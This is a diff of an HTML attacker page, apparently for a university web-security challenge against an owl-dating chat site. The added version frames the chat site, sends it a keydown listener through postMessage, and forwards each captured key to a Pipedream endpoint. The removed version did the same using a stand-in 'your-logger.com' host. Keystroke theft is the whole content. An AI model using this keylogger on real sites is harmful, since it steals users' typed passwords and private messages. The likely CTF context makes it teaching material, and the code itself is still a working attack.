@@ -1,38 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Owley Madison - SWAG Challenge</title>
-</head>
-<body>
-  <h1>Welcome Owls 🦉</h1>
-  <p>This is the future of owl dating.</p>
-
-  <!-- Load the chat page in an iframe -->
-  <iframe id="chatFrame" src="https://chat.owley.websec.saarland/" width="800" height="600"></iframe>
-
+  <title>Owley Logger</title>
   <script>
-    // Wait until the iframe loads
-    const iframe = document.getElementById("chatFrame");
+    // Function to send logs to your Pipedream endpoint
+    function logToServer(data) {
+      fetch("https://eooaktfbjo7cto7.m.pipedream.net", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({ data: data })
+      });
+    }
 
-    iframe.onload = function() {
+    function setupKeylogger() {
+      const iframe = document.getElementById('chat_frame');
+      const chatOrigin = 'https://chat.websec.saarland';
+
+      // Inject keylogger script into the iframe
+      const injectScript = `
+        window.addEventListener('keydown', (e) => {
+          // Send key back to parent
+          window.parent.postMessage({ key: e.key }, '*');
+        });
+        true; // Needed for Safari compatibility
+      `;
+
       try {
-        // Inject a keylogger using postMessage
-        iframe.contentWindow.postMessage(`
-          (function(){
-            document.addEventListener('keydown', function(e) {
-              fetch('https://your-logger.com/log?key=' + encodeURIComponent(e.key));
-            });
-          })();
-        `, '*'); // * allows to send to any origin
+        // Wait for iframe to load, then inject the script
+        iframe.contentWindow.postMessage({
+          type: 'inject',
+          script: injectScript
+        }, chatOrigin);
       } catch (e) {
-        console.error("Error injecting:", e);
+        logToServer("Error: " + e.message);
       }
-    };
+    }
 
-    // Listen for messages if needed
-    window.addEventListener("message", function(event) {
-      console.log("Message received:", event.data);
+    // Listen for messages from the iframe (keystrokes)
+    window.addEventListener('message', (e) => {
+      if (e.data && e.data.key) {
+        logToServer(e.data.key);
+      }
     });
   </script>
+</head>
+<body>
+  <h1>Welcome Owley 😈</h1>
+  <iframe 
+    id="chat_frame"
+    src="https://chat.websec.saarland" 
+    onload="setupKeylogger()"
+    style="width: 100%; height: 500px; border: 1px solid black;"
+  ></iframe>
 </body>
 </html>
